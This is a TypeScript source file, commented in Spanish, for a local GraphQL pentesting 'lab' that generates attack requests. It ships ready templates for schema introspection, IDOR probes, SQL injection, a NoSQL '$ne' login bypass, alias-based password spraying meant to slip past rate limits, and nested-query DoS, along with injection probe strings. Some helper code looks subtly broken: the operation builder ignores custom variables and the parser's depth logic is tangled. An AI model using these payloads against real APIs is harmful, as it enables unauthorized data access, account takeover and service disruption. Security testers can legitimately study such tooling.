/* GraphQL Lab — builder de operaciones, traductor query→JSON para POST,
   introspección, batching y ataques. 100% local: genera texto, no envía nada. */

export interface GqlTemplate {
  id: string
  name: string
  op: 'query' | 'mutation'
  risk: 'alta' | 'media' | 'baja'
  why: string
  template: string // con placeholders $VAR
  variables?: Record<string, string> // valores de ejemplo para el POST
}

export const GQL_TEMPLATES: GqlTemplate[] = [
  {
    id: 'introspect',
    name: 'Introspección completa',
    op: 'query',
    risk: 'alta',
    why: 'El clásico: __schema devuelve TODO el esquema. Si funciona en producción, la API se documenta sola para el atacante. Los defensores lo bloquean con ACL o validación de profundidad — y gran parte de las APIs internas lo permiten.',
    template: `query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields(includeDeprecated: true) {
        name
        type { name kind ofType { name kind } }
        args { name type { name kind ofType { name kind } } }
      }
    }
  }
}`,
  },
  {
    id: 'introspect-mini',
    name: 'Introspección minificada (1 línea)',
    op: 'query',
    risk: 'alta',
    why: 'Versión compacta para pasarla en GET ?query=... o en un body sin saltos de línea. Si el servidor la rechaza, prueba con __typeName en vez de __schema (algunos WAF filtran por nombre).',
    template: 'query{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind ofType{name kind}}}}}}',
  },
  {
    id: 'idorscan',
    name: 'Prueba IDOR genérica',
    op: 'query',
    risk: 'alta',
    why: 'GraphQL no autoriza por objeto: la capa de negocio es la que debe comprobar propiedad. Pide un objeto con id ajeno (1, 2, uuid del admin) y compara la respuesta: si devuelve datos de otro usuario, hay BOLA horizontal.',
    template: `query IDOR($id: ID!) {
  user(id: $id) {
    id
    email
    role
  }
}`,
    variables: { id: '2' },
  },
  {
    id: 'fieldbrute',
    name: 'Brute force de campos sugeridos',
    op: 'query',
    risk: 'media',
    why: 'Si el campo no existe, GraphQL SUGIERE el nombre parecido ("Did you mean...?"). Mete un campo inventado y recoge sugerencias del error: es un oráculo para enumerar el esquema sin introspección.',
    template: `query Suggest {
  user(id: "1") {
    id
    pwd
  }
}`,
  },
  {
    id: 'sqli',
    name: 'Inyección SQL vía argumentos',
    op: 'query',
    risk: 'alta',
    why: 'Los argumentos GraphQL suelen acabar en queries SQL sin parametrizar (el desarrollador ve "tipado fuerte" y relaja el backend). Un \' o " en el argumento delata el error del driver.',
    template: `query SqliTest($email: String!) {
  user(email: $email) {
    id
    email
  }
}`,
    variables: { email: "' OR '1'='1" },
  },
  {
    id: 'nosql',
    name: 'Inyección NoSQL vía variables',
    op: 'query',
    risk: 'alta',
    why: 'Si las variables llegan como objeto al driver Mongo, un $ne se cuela entero: el login compara "no igual a null" y entra sin contraseña.',
    template: `mutation NoSqlLogin($user: String!, $pass: String!) {
  login(user: $user, pass: $pass) {
    token
  }
}`,
    variables: { user: 'admin', pass: '{"$ne": null}' },
  },
  {
    id: 'aliasstorm',
    name: 'Alias storm (diferencial en 1 petición)',
    op: 'query',
    risk: 'media',
    why: 'Los alias permiten lanzar 100 peticiones lógicas en UNA: ideal para password spraying sin saltar rate limits por petición. Si funciona, el rate limit del servidor solo cuenta 1.',
    template: `query AliasStorm {
  a1: login(user: "admin", pass: "123456") { ok }
  a2: login(user: "admin", pass: "password") { ok }
  a3: login(user: "root", pass: "toor") { ok }
}`,
  },
  {
    id: 'deepnest',
    name: 'Anidamiento profundo (DoS)',
    op: 'query',
    risk: 'media',
    why: 'Un objeto que referencia a objetos que se auto-referencian explota en coste exponencial. Si el servidor no limita la profundidad, 10 niveles bastan para clavar la CPU.',
    template: `query Deep {
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            email
          }
        }
      }
    }
  }
}`,
  },
]

/* ─── builder de operación ─── */

export const buildOperation = (t: GqlTemplate, customVars: Record<string, string> = {}): string => t.template

/* Traduce query + variables → body JSON para POST. Minify opcional (quita
   comentarios y colapsa espacios fuera de strings). */
export const buildPostBody = (query: string, vars: Record<string, string>, opName?: string, minify = true): string => {
  let q = query
  if (minify) {
    q = q.replace(/#[^\n]*/g, '').replace(/\s+/g, ' ').trim()
  }
  const body: Record<string, unknown> = { query: q }
  if (opName?.trim()) body.operationName = opName.trim()
  const varEntries = Object.entries(vars).filter(([k, v]) => k.trim() !== '')
  if (varEntries.length) body.variables = Object.fromEntries(varEntries.map(([k, v]) => [k.trim(), coerceScalar(v)]))
  return JSON.stringify(body, null, minify ? 0 : 2)
}

/* Convierte strings tipo variable a su tipo lógico para el JSON: true/false/null,
   números y objetos JSON reales; lo demás se queda como string. */
export const coerceScalar = (v: string): unknown => {
  const t = v.trim()
  if (t === 'true') return true
  if (t === 'false') return false
  if (t === 'null') return null
  if (/^-?\d+(\.\d+)?$/.test(t)) return Number(t)
  if ((t.startsWith('{') && t.endsWith('}')) || (t.startsWith('[') && t.endsWith(']'))) {
    try { return JSON.parse(t) } catch { return t }
  }
  return v
}

/* ─── traductor inverso: JSON POST → query legible ─── */

export interface ParsedGql {
  ok: boolean
  error?: string
  opType: string
  opName: string
  varDefs: { name: string; type: string; default?: string }[]
  fields: string[] // árbol plano con indentación "  · campo"
  rawVars: string
  usesVariables: boolean
}

const countIndent = (s: string): number => {
  const m = s.match(/^[ \n]*/)
  return m ? m[0].length : 0
}

export const parseGql = (source: string): ParsedGql => {
  const fail = (error: string): ParsedGql => ({ ok: false, error, opType: '', opName: '', varDefs: [], fields: [], rawVars: '', usesVariables: false })
  const q = source.trim()
  if (!q) return fail('pega una operación GraphQL o un body JSON de POST')
  // Si parece JSON de POST, extrae query/variables
  let query = q
  let rawVars = ''
  if (q.startsWith('{')) {
    try {
      const j = JSON.parse(q) as { query?: string; variables?: unknown }
      if (typeof j.query === 'string') {
        query = j.query
        rawVars = j.variables ? JSON.stringify(j.variables, null, 2) : ''
      } else return fail('el JSON no tiene campo "query"')
    } catch { return fail('JSON inválido') }
  }
  if (!/[a-z]/i.test(query)) return fail('no parece una operación GraphQL')
  const opMatch = query.match(/\b(query|mutation|subscription)\b/i)
  if (!opMatch) return fail('no se encuentra query/mutation/subscription')
  const opType = opMatch[1].toLowerCase()
  const nameMatch = query.match(new RegExp(`\\b${opType}\\s+([A-Za-z_]\\w*)`))
  const opName = nameMatch ? nameMatch[1] : '(anónima)'
  const varBlock = query.match(/\(([^)]*)\)\s*\{/)
  const varDefs: { name: string; type: string; default?: string }[] = []
  if (varBlock) {
    for (const m of varBlock[1].matchAll(/\$([A-Za-z_]\w*)\s*:\s*([^,=)]+)(?:=\s*([^,)]+))?/g)) {
      varDefs.push({ name: `$${m[1]}`, type: m[2].trim(), default: m[3]?.trim() })
    }
  }
  // campos: trocea el cuerpo por llaves siguiendo nesting
  const bodyStart = query.indexOf('{')
  const fields: string[] = []
  let depth = 0
  let cur = ''
  const usesVariables = /\$[A-Za-z_]\w*/.test(query.slice(bodyStart))
  for (let i = bodyStart; i < query.length; i++) {
    const ch = query[i]
    if (ch === '{') {
      if (depth === 0) { depth++; continue }
    }
    if (ch === '}') { depth--; if (depth === 0) break }
    if (ch === '{' || (ch === '}' && depth > 1)) {
      // cierre de subselección: guarda lo acumulado como línea con marca
      if (cur.trim()) fields.push(`${'  '.repeat(Math.max(0, depth - 1))}${cur.trim()}`)
      cur = ''
      if (ch === '}') { depth--; if (depth === 0) break } else continue
    }
    if (depth === 1 && ch === '{') { depth++; continue }
    if (ch === ',' || ch === '\n') {
      if (cur.trim()) fields.push(`${'  '.repeat(Math.max(0, depth - 1))}${cur.trim()}`)
      cur = ''
      continue
    }
    cur += ch
  }
  if (cur.trim()) fields.push(cur.trim())
  const cleaned = fields
    .map((f) => f.replace(/\s+/g, ' ').replace(/^ +/, ''))
    .filter((f) => f && !f.startsWith('('))
    .map((f) => {
      const indentMatch = f.match(/^ */)
      const ind = indentMatch ? indentMatch[0].length : 0
      return `${'  '.repeat(Math.floor(ind / 2))}${f.trim()}`
    })
  return { ok: true, opType, opName, varDefs, fields: cleaned.slice(0, 80), rawVars, usesVariables }
}

/* ─── batch ─── */

export const buildBatch = (templates: string[], count = 3): string =>
  JSON.stringify(templates.slice(0, count).map((t) => ({ query: t.replace(/#[^\n]*/g, '').replace(/\s+/g, ' ').trim() })), null, 2)

/* ─── validador de inyección en el propio GraphQL ─── */

export const GQL_INJECTION_TESTS: { name: string; input: string; what: string }[] = [
  { name: 'Argument injection (ID type)', input: 'id=\n', what: 'salto de línea en un argumento tipo ID delata parsers laxos y a veces rompe el logging del backend' },
  { name: 'Field collision', input: '__schema', what: 'si llega como nombre de campo de usuario, el servidor no filtra metacampos' },
  { name: 'Directive probe', input: '@skip(if: true)', what: 'directivas insertadas en campos de usuario: mide si el parser valida la gramática' },
  { name: 'Fragment depth', input: '...on Query', what: 'fragmentos inline tipo @on: si se aceptan en argumentos, el parser confunde capas' },
  { name: 'Null-byte en nombre', input: 'user%00', what: 'URL-encoded en variables: comprueba validación de caracteres del resolvers' },
]

/* ─── variable por tipo (ayuda del builder) ─── */

export const SAMPLE_VARS: Record<string, Record<string, string>> = {
  id: { id: '1' },
  email: { email: 'admin@target.com' },
  user: { user: 'admin' },
  pass: { pass: '{"$ne": null}' },
}
